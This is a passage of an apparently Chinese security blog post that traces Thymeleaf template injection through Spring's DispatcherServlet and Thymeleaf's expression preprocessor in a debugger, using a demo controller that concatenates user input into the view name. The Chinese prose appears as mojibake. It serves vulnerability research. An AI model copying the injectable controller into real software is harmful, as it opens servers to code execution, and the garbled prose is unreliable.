class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mechoy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ThymeleafDemo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ThymeleafDemo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>ThymeleafDemo<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-devtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">excludes</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">exclude</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">excludes</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>æµ‹è¯•Thymeleafæ¨¡æ¿æ³¨å…¥<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">th:action</span>=<span class="hljs-string">&quot;@&#123;/test&#125;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;path&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;payload&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>æäº¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> </span>&#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>        log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œç›´æ¥ä»<code>org.springframework.web.servlet.DispatcherServlet</code>å¼€å§‹è¿›è¡Œåˆ†æ</p>
<p>ä»DispatcherServletã€å‰ç½®æ§åˆ¶å™¨ã€‘å¼€å§‹ï¼Œå¦‚è¿‡å¯¹SpringMVCæ¯”è¾ƒç†Ÿæ‚‰å¯ä»¥ç›´æ¥F8ï¼Œä¸ç†Ÿæ‚‰çš„è¯ï¼Œå¯ä»¥åƒæˆ‘ä¸€æ ·ï¼Œé€‰æ‹©æ€§ä¸çœ‹ğŸ˜…ï¼Œè¿™é‡Œæœ‰ä¸ªç®€å•çš„å…³äºdoDispatchçš„è¯´æ˜</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    HttpServletRequest processedRequest = request;<br>    HandlerExecutionChain mappedHandler = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">boolean</span> multipartRequestParsed = <span class="hljs-keyword">false</span>;<br>    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ModelAndView mv = <span class="hljs-keyword">null</span>;<br>            Object dispatchException = <span class="hljs-keyword">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯æ–‡ä»¶ä¸Šä¼ è¯·æ±‚</span><br>                processedRequest = <span class="hljs-keyword">this</span>.checkMultipart(request);<br>                multipartRequestParsed = processedRequest != request;<br>                <span class="hljs-comment">// checkMultipart() å½“ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ çš„è¯·æ±‚æ—¶ï¼Œä¸ä¼šåšä»»ä½•æ“ä½œ</span><br>                mappedHandler = <span class="hljs-keyword">this</span>.getHandler(processedRequest);<br>                <span class="hljs-comment">// å¦‚æœæ²¡æœ‰ç¬¦åˆè¯¥è¯·æ±‚çš„é€‚é…å™¨(mapperHandler),å°†ä¼šç›´æ¥è¿”å›404</span><br>                <span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-keyword">null</span>) &#123;<br>                    <span class="hljs-keyword">this</span>.noHandlerFound(processedRequest, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-comment">// è·å–ä¸è¯·æ±‚ç›¸ç¬¦çš„HandlerAdapterï¼ˆé€‚é…å™¨ï¼‰</span><br>                HandlerAdapter ha = <span class="hljs-keyword">this</span>.getHandlerAdapter(mappedHandler.getHandler());<br>                String method = request.getMethod();<span class="hljs-comment">// è·å–è¯·æ±‚æ–¹æ³•</span><br>                <span class="hljs-keyword">boolean</span> isGet = HttpMethod.GET.matches(method); <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦ä¸ºgetæ–¹æ³•</span><br>                <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯HttpMethodä¸­å­˜åœ¨çš„æ–¹æ³•,è¯·æ±‚æ–¹æ³•ä¸ºGETåˆ™è¿›å…¥</span><br>                <span class="hljs-keyword">if</span> (isGet || HttpMethod.HEAD.matches(method)) &#123;<br>                    <span class="hljs-keyword">long</span> lastModified = ha.getLastModified(request, mappedHandler.getHandler());<br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> ServletWebRequest(request, response)).checkNotModified(lastModified) &amp;&amp; isGet) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-comment">// æ‹¦æˆªå™¨ï¼Œæ‰§è¡ŒpreHandleæ‹¦æˆªå™¨</span><br>                <span class="hljs-keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-comment">// æ‰§è¡ŒControllerã€è¯·æ±‚å¤„ç†å™¨ã€‘ä¸­çš„ç›¸åº”æ–¹æ³•ã€å¤„ç†è¯·æ±‚ï¼Œåšå‡ºå“åº”ã€‘</span><br>                mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br>                <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>				<span class="hljs-comment">// è·å–è§†å›¾View</span><br>                <span class="hljs-keyword">this</span>.applyDefaultViewName(processedRequest, mv);<br>                <span class="hljs-comment">// æ‹¦æˆªå™¨åç½®å¤„ç†</span><br>                mappedHandler.applyPostHandle(processedRequest, response, mv);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var20) &#123;<br>                dispatchException = var20;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var21) &#123;<br>                dispatchException = <span class="hljs-keyword">new</span> NestedServletException(<span class="hljs-string">&quot;Handler dispatch failed&quot;</span>, var21);<br>            &#125;<br>            <span class="hljs-comment">// åˆ©ç”¨mvè¿›è¡Œé¡µé¢æ¸²æŸ“</span><br>            <span class="hljs-keyword">this</span>.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>            <span class="hljs-keyword">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, var22);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var23) &#123;<br>            <span class="hljs-comment">// å®Œæˆé¡µé¢æ¸²æŸ“å¹¶è°ƒç”¨æ‹¦æˆªå™¨çš„afterCompletion()</span><br>            <span class="hljs-keyword">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, <span class="hljs-keyword">new</span> NestedServletException(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, var23));<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æ˜¯å¼‚æ­¥è¯·æ±‚</span><br>        <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>            <span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-keyword">null</span>) &#123;<br>                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (multipartRequestParsed) &#123;<br>            <span class="hljs-comment">// åˆ é™¤ä¸Šä¼ çš„èµ„æº</span><br>            <span class="hljs-keyword">this</span>.cleanupMultipart(processedRequest);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A51.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°ç¬¬517è¡Œï¼Œè¿›å…¥è§†å›¾æ¸²æŸ“çš„åœ°æ–¹ï¼Œè¯¥æ–¹æ³•å‰é¢åªæ˜¯ä¸€äº›å‚æ•°çš„å®šä¹‰å’Œåˆ¤æ–­</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A52.png" srcset="/img/loading.gif" lazyload></p>
<p>ç›´æ¥åˆ°æ¥ç¬¬570è¡Œï¼Œè·Ÿè¿›render()ã€render()æ–¹æ³•ï¼Œçœ‹åå­—â€“&gt;è§†å›¾æ¸²æŸ“ã€‘</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A53.png" srcset="/img/loading.gif" lazyload></p>
<p>åŒæ ·æ–¹æ³•çš„å‰é¢ä¸æ€ä¹ˆéœ€è¦å…³æ³¨ï¼Œä½†719è¡Œå¯ä»¥ç¨å¾®çœ‹ä¸€ä¸‹ã€è·å–æœ€ä¼˜è§†å›¾è§£æå™¨ã€‘</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> View <span class="hljs-title">resolveViewName</span><span class="hljs-params">(String viewName, <span class="hljs-meta">@Nullable</span> Map&lt;String, Object&gt; model, Locale locale, HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.viewResolvers != <span class="hljs-keyword">null</span>) &#123;	<span class="hljs-comment">// åˆ¤æ–­å½“å‰IOCå®¹å™¨ä¸­æ˜¯å¦æœ‰è§†å›¾è§£æå™¨</span><br>        Iterator var5 = <span class="hljs-keyword">this</span>.viewResolvers.iterator();	<span class="hljs-comment">// å°†æ‰€æœ‰çš„è§†å›¾è§£æå™¨æ”¾åˆ°ä¸€ä¸ªè¿­ä»£å™¨é‡Œé¢è¿›è¡Œå¾ªç¯</span><br><br>        <span class="hljs-keyword">while</span>(var5.hasNext()) &#123;	<span class="hljs-comment">// å¾ªç¯æ‰¾å‡ºæœ€ä¼˜è§†å›¾è§£æå™¨</span><br>            ViewResolver viewResolver = (ViewResolver)var5.next();<br>            <span class="hljs-comment">// æ ¹æ®è¯¥æ–¹æ³•ä¸­çš„ getBestView() å¯»æ‰¾æœ€ä¼˜è§†å›¾è§£æå™¨</span><br>            View view = viewResolver.resolveViewName(viewName, locale);<br>            <span class="hljs-keyword">if</span> (view != <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> view;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A54.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°739è¡Œï¼Œè°ƒç”¨è·å–åˆ°çš„è§†å›¾è§£æå™¨çš„render()ï¼Œç»§ç»­è·Ÿè¿›</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A55.png" srcset="/img/loading.gif" lazyload></p>
<p>æ­¤æ—¶æ¥åˆ°<code>org.thymeleaf.spring5.view.ThymeleafView</code></p>
<p>ThymeleafViewä¸­çš„render()åˆå»è°ƒç”¨renderFragment()å¯¹è§†å›¾è¿›è¡Œæ¸²æŸ“ï¼Œè·Ÿè¿›</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A56.png" srcset="/img/loading.gif" lazyload></p>
<p><code>renderFragment()</code>å‰é¢éƒ¨åˆ†åŒæ ·æ˜¯ä¸€äº›å‚æ•°çš„å®šä¹‰ä¸åˆ¤æ–­ï¼Œå•æ­¥æ¥åˆ°ThymeleafViewçš„101è¡Œï¼ŒçŒœæµ‹æ­¤å¤„åˆ¤æ–­è§†å›¾æ¸²æŸ“ä¸­æ˜¯å¦å­˜åœ¨<strong>ç‰‡æ®µè¡¨è¾¾å¼</strong></p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A57.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A58.png" srcset="/img/loading.gif" lazyload></p>
<p>å•æ­¥å‘ä¸‹ï¼Œæ¥åˆ°Class ThymeleafViewçš„109è¡Œï¼Œæ­¤å¤„å¼€å§‹å¤„ç†è¡¨è¾¾å¼ï¼Œè·Ÿè¿›ã€‚æ­¤å¤„å†viewTemplateNameå¤–å¢åŠ äº†<code>~&#123;...&#125;~</code>ï¼Œä¹Ÿå°±æ˜¯ç‰‡æ®µè¡¨è¾¾å¼çš„æ ·å­ï¼Œ</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A59.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°<code>org.thymeleaf.standard.expression.StandardExpressionParser</code>çš„ç¬¬41è¡Œ</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A510.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿›è¡Œä¸€ä¸ªä¸‰æ­¥è¿ç®—ï¼Œé¢„å¤„ç†çš„å€¼ï¼Œæ¢ä¸ªæ€è·¯ä¹Ÿå°±æ˜¯ï¼Œåˆ¤æ–­ä¸€ä¸‹æ˜¯å¦å­˜åœ¨éœ€è¦æ‰§è¡Œçš„è¡¨è¾¾å¼ï¼Œå¦‚æœæœ‰åˆ™æ‰§è¡Œä¸€ä¸‹è¡¨è¾¾å¼ï¼Œæ²¡æœ‰åˆ™ç›´æ¥è¿”å›ï¼Œè·Ÿè¿›ï¼Œå› ä¸ºpreprocessä¼ å…¥çš„å€¼æ˜¯trueï¼Œæ‰€ä»¥ä¸€å®šæ˜¯æ‰§è¡Œ<code>StandardExpressionPreprocessor.preprocess(context, input)</code></p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A511.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°<code>org.thymeleaf.standard.expression.StandardExpressionPreprocessor</code>ç¬¬17è¡Œï¼Œå…ˆæ˜¯åˆ¤æ–­ä¸€ä¸‹æ˜¯å¦å­˜åœ¨<code>_</code>ï¼Œä¹Ÿå°±æ˜¯æƒ³çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨éœ€è¦é¢„å¤„ç†çš„ä¸œè¥¿</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A512.png" srcset="/img/loading.gif" lazyload></p>
<p>æ­£åˆ™åŒ¹é…ï¼Œæ ¹æ®è¯¥ç±»å®šä¹‰çš„æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">char</span> PREPROCESS_DELIMITER = <span class="hljs-string">&#x27;_&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String PREPROCESS_EVAL = <span class="hljs-string">&quot;\\_\\_(.*?)\\_\\_&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Pattern PREPROCESS_EVAL_PATTERN = Pattern.compile(<span class="hljs-string">&quot;\\_\\_(.*?)\\_\\_&quot;</span>, <span class="hljs-number">32</span>);<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A513.png" srcset="/img/loading.gif" lazyload></p>
<p>ç„¶åæ˜¯åˆ¤æ–­ä¸€ä¸‹æ²¡æœ‰åŒ¹é…åˆ°ä¸œè¥¿ï¼Œæ²¡æœ‰åŒ¹é…åˆ°<code>return checkPreprocessingMarkUnescaping(input);</code></p>
<p>æ¥ä¸‹æ¥è¿›å…¥<code>do...while&#123;&#125;</code>å¾ªç¯,å»åˆ¤æ–­ä¸€ä¸‹é¢„å¤„ç†è¡¨è¾¾å¼ä¸­æ˜¯å¦åŒ…å«äº†å¦ä¸€ä¸ªé¢„å¤„ç†è¡¨è¾¾å¼</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">do</span> &#123;<br>    remaining = checkPreprocessingMarkUnescaping(input.substring(curr, matcher.start(<span class="hljs-number">0</span>)));	<br>    String expressionText = checkPreprocessingMarkUnescaping(matcher.group(<span class="hljs-number">1</span>));	<span class="hljs-comment">// æå–åŒä¸‹åˆ’çº¿ä¸­é—´çš„å€¼</span><br>    strBuilder.append(remaining);	<br>    IStandardExpression expression = StandardExpressionParser.parseExpression(context, expressionText, <span class="hljs-keyword">false</span>);	<span class="hljs-comment">// 